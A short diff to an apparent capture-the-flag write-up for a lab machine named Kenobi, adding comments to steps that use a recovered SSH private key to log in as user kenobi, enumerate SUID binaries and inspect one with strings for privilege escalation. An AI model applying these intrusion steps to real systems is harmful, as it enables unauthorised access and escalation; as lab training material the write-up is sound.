@@ -261,6 +261,7 @@ Py/CLlDCU4e+49XBAPKEmY4DuN+J2Em/tCz7dzfCNS/mpsSEn0jo
 Use the id_rsa to access the target as the user kenobi:
 
 ```shell
+# Now run the commands below to copy the id_rsa to our desktop and use it to get access
 cp id_rsa /home/kali/Desktop
 cd /home/kali/Desktop
 sudo chmod 600 id_rsa
@@ -281,6 +282,7 @@ cat /home/kenobi/user.txt
 Lets enumerate SUIDs:
 
 ```shell
+# Checking SUIDs
 find / -perm -u=s -type f 2>/dev/null
 
 # We found an unusual SUID
@@ -308,8 +310,10 @@ If we run the binary, we will see 3 options:
 Use strings to see how the binary works:
 
 ```shell
+# Using strings
 strings /usr/bin/menu
 
+# Results
 <SNIP>
 []A\A]A^A_
 ***************************************
